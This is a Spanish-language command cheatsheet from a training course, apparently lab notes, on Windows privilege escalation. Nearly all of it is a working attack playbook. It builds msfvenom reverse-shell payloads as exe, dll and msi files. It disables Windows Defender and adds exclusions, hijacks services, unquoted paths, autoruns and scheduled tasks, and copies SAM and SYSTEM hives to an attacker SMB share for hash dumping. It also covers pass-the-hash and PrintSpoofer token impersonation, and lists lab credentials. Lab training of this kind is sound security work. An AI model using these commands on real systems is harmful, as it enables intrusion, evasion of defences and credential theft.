---
title: "Cheatsheet de Comandos - Escalada de Privilegios en Windows"
date: "2026-10-08"
author: "Manuel FR"
tags:
  - ifct0109
  - poc
  - escalada-de-privilegios-en-windows
  - cheatsheet
  - comandos
  - privilege-escalation
---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Escalada de Privilegios en Windows/00 - Índice del Módulo Escalada de Privilegios en Windows|Índice del Módulo]]

---
# ⚡ Cheatsheet de Comandos - Escalada de Privilegios en Windows

> [!tip] Referencia Rápida Oficial
> Esta guía recopila la totalidad de los comandos y secuencias de ataque utilizados a lo largo de las 17 prácticas del módulo de **Escalada de Privilegios en Windows** del curso IFCT0109.

```text
########################################
  FASE ESCALADA DE PRIVILEGIOS WINDOWS	           
########################################

### Credenciales ###
tecnico:SegInf
adminis:password123
User:password321

### Herramientas ###
$ impacket-smbserver info . -smb2support
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f exe -o revshell.exe
C:\tools> copy \\10.0.0.4\info\revshell.exe .\

#### Enumeración de Windows ####

### Información sobre la red
C:\tools> ipconfig /all 
C:\tools> arp -a
C:\tools> route print

Enumerar sistema de protección
Check Windows Defender Status
PS C:\s> Get-MpComputerStatus
	
Desactivar Windows Defender 
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true

Reactivar
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $false

Desinstalar Windows Defender 
PS > Uninstall-WindowsFeature -Name Windows-Defender

Desde CMD deshabilitarlo
C:\> Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet

C:\> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t  REG_DWORD /d 1 /f

Ver si existen exclusiones actualmente:
PS C:\> Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

Añadir una exclusión:
PS C:>  Add-MpPreference -ExclusionPath "C:\Ruta"

List AppLocker Rules
PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

Test AppLocker Policy
PS C:\> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

### Información del sistema
C:\tools> tasklist /svc       // Lista de procesos
C:\tools> netstat -ano		// Procesos y servicios se están ejecutando y si hay alguno de ellos que esté esperando conexiones.
C:\tools> set		// Mostrar todas las variables del sistema
C:\tools> systeminfo		// Mostrar información detallada sobre la configuración
C:\tools> wmic qfe			// Parches y actualizaciones
PS C:\> Get-HotFix | ft -AutoSize  		// Parches y actualizaciones
C:\tools> wmic product get name   	// Programas instalados
PS C:\> Get-WmiObject -Class Win32_Product | select Name, Version   // Programas instalados
PS C:\> Get-ItemPropertyValue -LiteralPath 'HKLM:SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full' -Name Release  // Versión de NET Framework.

### Información sobre usuarios y grupos
C:\> query user 		// Usuarios Logeados
C:\> echo %USERNAME% 		// Usuario actual
C:\> whoami /groups	// Grupos a los que pertenece el usuario actual

C:\> net user		// Listado de usuarios del sistema
C:\> net localgroup 	// Listado de grupos del sistema
C:\> net localgroup administradores   	// Listado de usuarios que pertenecen a un determinado grupo
C:\> net accounts  // Políticas relacionadas con contraseñas y otra información

### Asignación de permisos de usuarios
C:\> whoami /priv 		// Privilegios del usuario actual
	
	https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1
	https://www.leeholmes.com/adjusting-token-privileges-in-powershell/

### Tokens de acceso
C:\>whoami /all		// Conocer todos los privilegios del usuario actual

### Pipe Names
C:\tools\pipelist> pipelist64.exe /accepteula
PS C:\>  gci \\.\pipe\

C:\tools> accesschk.exe /accepteula \\.\Pipe\lsass -v

#### Explotando el Kernel de Windows ####
$ impacket-smbserver info . -smb2support
C:\tools> systeminfo >> \\10.0.0.5\info\systeminfo.txt

Windows Exploit Suggester
$ git clone https://github.com/bitsadmin/wesng --depth 1
$ cd wesng
$ python3 wes.py --update
$ python3 wes.py ../systeminfo.txt
$ python3 wes.py ../systeminfo.txt -o ../vulnerabilidades.txt
$ python3 wes.py ../systeminfo.txt --color --exploits-only
$ python3 wes.py ../systeminfo.txt --color -i 'Elevation of privilege'

#### Servicios ####
$ impacket-smbserver info . -smb2support
C:\tools> winPEASany.exe quiet servicesinfo >> \\10.0.0.4\info\winpeas_servicios.txt

### Insecure Service Permissions
Ejemplo:
$ cat winpeas_servicios.txt    // Info del servicio daclsvc
C:\tools> sc qc daclsvc
C:\tools> sc query daclsvc
C:\tools> icacls "C:\Program Files\DACL Service\daclservice.exe"
Explotación:
C:\tools> sc config daclsvc binpath="\"c:\tools\revshell.exe""
$ nc -lvnp 443
C:\tools> net start daclsvc

### DLL Hijacking
Ejemplo:
$ cat winpeas_servicios.txt    // Info del servicio dllsvc

C:\tools> sc qc dllsvc
C:\tools> sc query dllsvc
C:\tools> icacls "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"

Explotación:
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.61 LPORT=443 --platform windows -f dll -o hijackme.dll
C:\tools> copy \\10.0.0.4\info\hijackme.dll .\
C:\tools> copy hijackme.dll c:\Temp
$ nc -lvnp 443
C:\toos> net start dllsvc

### Unquoted Path
Ejemplo:
$ cat winpeas_servicios.txt    // Info del servicio unquotedsvc
C:\tools> sc qc unquotedsvc
C:\tools> sc query unquotedsvc
C:\tools> icacls "C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe"
C:\tools\Accesschk /accepteula -uwsq c:\

Explotación:
C:\tools>copy revshell.exe “C:\Program Files\Unquoted Path Service\Common.exe”
$ nc -lvnp 443
 C:\toos> net start unquotedsvc

#### Registro ####


### Autorun 
$ impacket-smbserver info . -smb2support
C:\tools> winPEASany.exe quiet applicationsinfo >> \\10.0.0.4\info\winpeas_registro.txt

$ cat winpeas_registro.txt    // Autorun
C:\tools> icacls "C:\Program Files\Autorun Program\program.exe"
C:\tools> copy "C:\Program Files\Autorun Program\program.exe" c:\tools\program.exe
C:\tools> copy revshell.exe "C:\Program Files\Autorun Program\program.exe"
$ nc -lvnp 443
// Cerramos sesión del usuario y volvemos a iniciarla.

### Always Install Elevates
$ impacket-smbserver info . -smb2support
C:\tools> winPEASany.exe quiet windowscreds >> \\10.0.0.4\info\winpwadCreds.txt

$ cat winpeas_registro.txt    // AllwaysInstallElevated
C:\tools>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
C:\tools>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Explotación
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.61 LPORT=443 --platform windows  -f msi -o reverse.msi
C:\tools> copy \\10.0.0.4\info\reverse.msi .\
$ nc -lvnp 443
C:\tools>msiexec /quiet /qn /i reverse.msi

#### Contraseñas ####

### Registro de windows
$ impacket-smbserver info . -smb2support
C:\tools> winPEASany.exe quiet filesinfo userinfo >> \\10.0.0.4\info\winpeas_Passwords.txt
$ cat winpeas_Passwords.txt

Explotación:
winexe -U 'adminis%password123' //10.0.0.200 cmd.exe
impacket-psexec adminis@10.0.0.200

### Almacenadas en windows
c:\tools> cd c:\Utilities
c:\Utilities> savecred.bat 

$ impacket-smbserver info . -smb2support
C:\tools> winPEASany.exe quiet windowscreds >> \\10.0.0.4\info\winpeascmdcreds.txt
$ cat winpeascmdcreds.txt
c:\Utilities> cmdkey /list

Explotación:
c:\tools> runas /savecred /user:adminis c:\tools\revshell.exe 

### Almacenadas en archivos
c:\> dir /s *pass* == *.config
c:\> findstr /si password *.xml *.ini *.txt

$ impacket-smbserver info . -smb2support
C:\tools> winPEASany.exe quiet cmd searchfast filesinfo >> \\10.0.0.4\info\winpeasfilesinfo.txt
$cat winpeasfilesinfo.txt

Explotación:
c:\tools> net user
$ winexe -U 'adminis%password123' //10.0.0.200 cmd.exe

### Almacenadas en copia de SAM
$ impacket-smbserver info . -smb2support
C:\tools> winPEASany.exe quiet cmd searchfast filesinfo >> \\10.0.0.4\info\winpeasfilesinfo.txt
$cat winpeasfilesinfo.txt   // SAM

Explotación:
C:\tools> copy c:\windows\repair\SAM \\10.0.0.4\info\SAM
C:\tools> copy c:\windows\repair\SYSTEM \\10.0.0.4\info\SYSTEM

$ samdump2 SYSTEM SAM
$ /usr/share/creddump7/pwdump.py ./SYSTEM ./SAM

$ pth-winexe -U 'USUARIO%HASH:HASH' //10.0.0.200 cmd.exe
$ impacket-psexec -hashes HASH:HASH adminis@10.0.0.200

### Aplicaciones Instaladas ###
c:\tools> tasklist /v
c:\tools> wmic product get name

### Aplicaciones en el Inicio ###
c:\tools> icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

Explotación:
c:\tools> copy revchell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

### Tareas Programadas ###
C:\tools> schtasks /query /fo LIST /v
PS C:\> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
C:\tools> icacls "C:\Missing Scheduled Binary\scheduled.exe"

Explotación:
c:\tools> copy "C:\Missing Scheduled Binary\scheduled.exe" c:\tools
c:\tools> copy revshell.exe "C:\Missing Scheduled Binary\scheduled.exe"
$ nc -lvnp 443

### Token Impersonate ###
c:\tools> systeminfo
PS > Get-ItemPropertyValue -LiteralPath 'HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full' -Name Release
C:\> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Release  
$ nc -lvnp 443
C:\> cd c:\tools\tokens
c:\tools\tokens> PrintSpoofer.exe -i -c c:\tools\revshell.exe
```



---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Escalada de Privilegios en Windows/00 - Índice del Módulo Escalada de Privilegios en Windows|Índice del Módulo]]
